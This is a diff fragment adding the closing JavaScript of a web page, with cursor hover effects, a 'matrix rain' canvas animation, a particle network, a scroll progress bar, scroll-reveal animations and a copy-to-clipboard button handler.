+  el.addEventListener('mouseleave',()=>{cur.style.width='12px';cur.style.height='12px';cur.style.background='#00e5a0';curR.style.width='36px';curR.style.height='36px';});
+});
+/* MATRIX RAIN — exact from index.html */
+(function(){const cv=document.getElementById('matrix-canvas'),ctx=cv.getContext('2d');let W,H,cols,drops;const ch='01アイウエオカキクケコサシスセソタチツテトナニヌネノ'.split('');function init(){W=cv.width=window.innerWidth;H=cv.height=window.innerHeight;cols=Math.floor(W/18);drops=Array(cols).fill(0).map(()=>Math.random()*-80);}function draw(){ctx.fillStyle='rgba(2,6,8,0.05)';ctx.fillRect(0,0,W,H);for(let i=0;i<cols;i++){const c=ch[Math.floor(Math.random()*ch.length)];ctx.fillStyle=Math.random()>.96?'#ffffff':'#00e5a0';ctx.globalAlpha=Math.random()*.5+.3;ctx.font='13px monospace';ctx.fillText(c,i*18,drops[i]*18);if(drops[i]*18>H&&Math.random()>.975)drops[i]=0;drops[i]+=.4;}ctx.globalAlpha=1;}init();setInterval(draw,55);window.addEventListener('resize',init);})();
+/* PARTICLES — exact from index.html */
+(function(){const cv=document.getElementById('particle-canvas'),ctx=cv.getContext('2d');let W,H;const pts=[];function P(){this.reset=function(){this.x=Math.random()*W;this.y=Math.random()*H;this.r=Math.random()*1.4+.3;this.vx=(Math.random()-.5)*.3;this.vy=(Math.random()-.5)*.3;this.a=Math.random()*.35+.1;this.life=Math.random()*300+200;this.age=0;};this.reset();}P.prototype.upd=function(){this.x+=this.vx;this.y+=this.vy;this.age++;if(this.age>this.life||this.x<0||this.x>W||this.y<0||this.y>H)this.reset();};P.prototype.drw=function(){ctx.beginPath();ctx.arc(this.x,this.y,this.r,0,Math.PI*2);ctx.fillStyle='rgba(0,229,160,'+this.a+')';ctx.fill();};function init(){W=cv.width=window.innerWidth;H=cv.height=window.innerHeight;if(!pts.length)for(let i=0;i<100;i++)pts.push(new P());}function draw(){ctx.clearRect(0,0,W,H);for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<110){ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.strokeStyle='rgba(0,229,160,'+(0.07*(1-d/110))+')';ctx.lineWidth=.5;ctx.stroke();}}pts.forEach(p=>{p.upd();p.drw();});requestAnimationFrame(draw);}init();draw();window.addEventListener('resize',init);})();
+/* PROGRESS */
+window.addEventListener('scroll',()=>{const d=document.documentElement;const s=(d.scrollTop||document.body.scrollTop)/(d.scrollHeight-d.clientHeight);document.getElementById('prog').style.width=(s*100)+'%';},{passive:true});
+/* SCROLL REVEAL — exact from index.html */
+const obs=new IntersectionObserver(entries=>{entries.forEach((e,i)=>{if(e.isIntersecting)setTimeout(()=>e.target.classList.add('visible'),i*65);});},{threshold:.08});
+document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+/* COPY */
+function copyText(id){const el=document.getElementById(id);navigator.clipboard.writeText(el.innerText).then(()=>{const btn=el.parentElement.querySelector('.cbtn');btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',2000);});}
+</script>
+</body>
+</html>
